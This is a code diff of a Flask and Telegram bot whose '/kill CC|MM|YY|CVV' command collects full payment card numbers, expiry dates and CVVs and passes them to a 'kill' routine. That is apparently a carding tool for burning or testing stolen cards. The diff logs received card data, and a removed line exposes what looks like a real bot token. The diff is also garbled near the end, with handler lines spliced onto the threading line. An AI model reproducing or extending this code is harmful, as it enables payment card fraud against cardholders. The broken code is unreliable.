@@ -1,10 +1,11 @@
 from flask import Flask, request
+import threading
 import telebot
 import re
 import requests
 
 # --- Telegram Bot Token ---
-BOT_TOKEN = "7556380686:AAHkY7xVjw4j14fcQy-5dlCGu5rcXha6vRU"
+BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # --- Flask app ---
@@ -19,18 +20,15 @@ def kill_route():
     if request.method == 'POST':
         data = request.get_json(force=True)
         card = data.get('card')
+        print(f"Received card: {card}")
         return {"status": "ok", "card": card}, 200
     else:
         return {"status": "GET ok"}, 200
 
-# --- Telegram Command Handlers ---
+# --- Telegram Commands ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(
-        message,
-        "<b>Welcome!</b>\nUse /kill CC|MM|YY|CVV",
-        parse_mode='HTML'
-    )
+    bot.reply_to(message, "<b>Welcome!</b>\nUse /kill CC|MM|YY|CVV", parse_mode='HTML')
 
 @bot.message_handler(commands=['kill'])
 def handle_kill(message):
@@ -54,14 +52,11 @@ def handle_kill(message):
     except Exception as e:
         bot.reply_to(message, f"🚫 Error: {e}")
 
-# --- Run bot in background ---
-import threading
+# --- Run Telegram bot in background ---
 def run_bot():
     bot.polling(none_stop=True)
 
-threading.Thread(target=run_bot).start()    pan = match.group(1)
-    masked = pan[:6] + '*' * (len(pan)-10) + pan[-4:] if len(pan) > 10 else pan[:4] + '****' + pan[-4:]
-
+threading.Thread(target=run_bot).start()
     sent_message = bot.reply_to(message, f"<i>Kill initiated for <code>{masked}|{match.group(2)}|{match.group(3)}|{match.group(4)}</code>. Please wait...</i>", parse_mode='HTML')
 
     payload = {
